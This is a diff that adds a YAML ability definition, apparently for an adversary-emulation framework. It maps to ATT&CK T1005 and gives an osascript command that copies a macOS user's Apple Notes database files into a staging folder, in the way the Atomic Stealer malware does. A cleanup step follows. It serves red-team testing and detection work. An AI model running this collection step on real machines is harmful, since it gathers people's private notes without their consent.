@@ -1,0 +1,23 @@
+---
+- id: 9143818af7467aa6b6bbf999202baa69
+  name: Copy Apple Notes database files using AppleScript
+  description: 'This command will copy Apple Notes database files using AppleScript
+    as seen in Atomic Stealer.
+
+    '
+  tactic: collection
+  technique:
+    attack_id: T1005
+    name: Data from Local System
+  platforms:
+    darwin:
+      sh:
+        command: osascript -e 'tell application "Finder"' -e 'set destinationFolderPath
+          to POSIX file "#{destination_path}"' -e 'set notesFolderPath to (path to
+          home folder as text) & "Library:Group Containers:group.com.apple.notes:"'
+          -e 'set notesFolder to folder notesFolderPath' -e 'set notesFiles to {file
+          "NoteStore.sqlite", file "NoteStore.sqlite-shm", file "NoteStore.sqlite-wal"}
+          of notesFolder' -e 'repeat with aFile in notesFiles' -e 'duplicate aFile
+          to folder destinationFolderPath with replacing' -e 'end' -e 'end tell'
+        payloads: []
+        cleanup: rm "/private/tmp/NoteStore.sqlite*"
